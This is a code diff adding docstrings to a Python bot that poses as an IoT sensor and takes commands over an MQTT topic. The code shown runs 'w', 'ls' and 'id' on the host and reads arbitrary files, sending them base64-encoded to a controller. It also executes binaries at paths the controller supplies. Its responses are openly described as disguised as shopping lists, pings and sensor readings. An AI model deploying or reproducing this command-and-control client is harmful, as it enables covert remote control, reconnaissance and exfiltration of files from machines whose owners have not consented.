@@ -17,6 +17,10 @@ SENSOR_ID = "sensor_" + str(random.randint(1, 1000))
 
 
 def on_connect(client, userdata, flags, rc):
+    """
+        Callback triggered upon successful connection to the MQTT broker.
+        Subscribes the bot to the 'sensors' topic to listen for commands.
+    """
     if rc == 0:
         print(f"Sensor {SENSOR_ID} connected.")
         client.subscribe(TOPIC)
@@ -25,6 +29,11 @@ def on_connect(client, userdata, flags, rc):
 
 
 def on_message(client, userdata, msg):
+    """
+        Callback triggered when a message is received.
+        Parses the JSON payload, checks if the message is intended for this bot (or 'all'),
+        and dispatches the appropriate action function.
+    """
     try:
         payload = json.loads(msg.payload.decode())
 
@@ -45,7 +54,7 @@ def on_message(client, userdata, msg):
         elif action == "ls":
             get_content(client, sender, params if not params == {} else None)
         elif action == "id":
-            id(client, sender)
+            id_ping(client, sender)
         elif action == "log":
             send_log(client, sender, params if not params == {} else None)
         elif action == "s_info":
@@ -61,6 +70,9 @@ def on_message(client, userdata, msg):
 
 # --- Announce ---
 def announce(client, sender):
+    """
+        Responds to a presence check by publishing the bot's status and hostname.
+    """
     response = {
         "controller_id": sender,
         "sender_id": SENSOR_ID,
@@ -76,6 +88,10 @@ def announce(client, sender):
 
 # --- Logged users ---
 def logged_users(client, sender):
+    """
+        Executes the system 'w' command to list logged-in users and publishes the output.
+        The response is disguised as 'connected_users'.
+    """
     try:
         command = ['w']
         result = subprocess.run(command, capture_output=True, text=True, check=True).stdout.strip()
@@ -97,6 +113,11 @@ def logged_users(client, sender):
 
 # --- Content ---
 def get_content(client, sender, path=None):
+    """
+        Executes the 'ls' command to list directory contents.
+        If a path is provided, it lists that directory; otherwise, it lists the current directory.
+        The response is disguised as 'shopping_list_content'.
+    """
     try:
         command = ['ls']
         if path:
@@ -123,7 +144,11 @@ def get_content(client, sender, path=None):
 
 
 # --- ID ---
-def id(client, sender):
+def id_ping(client, sender):
+    """
+        Executes the 'id' command to retrieve current user identity and groups.
+        The response is disguised as 'ping_with_id'.
+    """
     try:
         command = ['id']
         result = subprocess.run(command, capture_output=True, text=True, check=True).stdout.strip()
@@ -146,6 +171,10 @@ def id(client, sender):
 
 # --- Copy file ---
 def send_log(client, sender, path):
+    """
+        Reads a specified file, encodes it in Base64, and publishes it to the controller.
+        The response is labeled as 'log_file'.
+    """
     if path is None:
         return
     try:
@@ -175,6 +204,10 @@ def send_log(client, sender, path):
 
 # --- Run executable ---
 def sensor_info(client, sender, path):
+    """
+        Executes a specific binary on the machine specified by the path.
+        The response is disguised as 'specialized_sensor_info'.
+    """
     if path is None:
         return
     try:
@@ -202,6 +235,10 @@ def sensor_info(client, sender, path):
 
 
 def main():
+    """
+        Main function to initialize the bot's MQTT client, connect to the broker,
+        and start the infinite loop to process incoming commands.
+    """
     client = mqtt.Client(client_id=SENSOR_ID)
     client.on_connect = on_connect
     client.on_message = on_message
